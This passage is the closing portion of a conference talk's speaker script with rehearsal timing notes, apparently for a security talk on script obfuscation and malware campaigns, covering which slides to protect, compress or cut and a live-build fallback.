on this slide; the quote already had its own standalone moment on Slide 35 and doesn't
need repeating on-screen here. Open the floor for questions.)*

---

## Rehearsal notes

- **Total structured content: 30:00 exactly**, matching the master brief's section
  budget (2 + 7 + 4 + 5 + 10 + 2). Slide 1 (title), Slide 35 (silent pull-quote beat),
  and Slide 36 (thank-you/applause) sit outside that clock, same as how a real walk-on
  and Q&A aren't part of a 30-minute slot's content time. **Slide 34 (GlobWarden) is
  different** — it's genuinely extra spoken content (~30 sec) added after the 30:00
  budget was finalized, not absorbed into existing slack. Time the whole talk in
  rehearsal with it included; if it pushes past the slot, it's the first thing to cut
  or shorten, not something to silently squeeze out of an earlier section.
- The four section-divider slides (3, 11, 16, 22) are **zero-cost** in this budget: each one is landed
  on immediately after a transition line that's already part of the previous slide's
  spoken content. If a divider feels like it needs its own beat in rehearsal, that's a
  sign to slow down the delivery of the preceding line, not to add time here.
- **Slides 7 and 9** (the eight-layer diagram and the wildcard IEX reveal) are the two
  "bragging rights" moments in Section 2 — protect their time first if anything runs
  long. Slides 5 and 6 are the most compressible if time needs recovering there.
- **Slide 14** (character masking vs. wildcard IEX) is the technical core of Section
  3 — if time pressure hits, trim Slide 12's speaker-note detail rather than cutting
  time from 14 or 15.
- **Slide 19** (ClearFake/Amatera/SectopRAT) is the strongest data point in Section 4
  — it's also the longest at ~75 seconds; don't compress it to recover time elsewhere
  in that section.
- **Slide 27**'s live-build carries real timing risk on an actual conference laptop —
  the static-reveal fallback described in its notes is the first thing to switch to
  if rehearsal shows the live-typing running long.
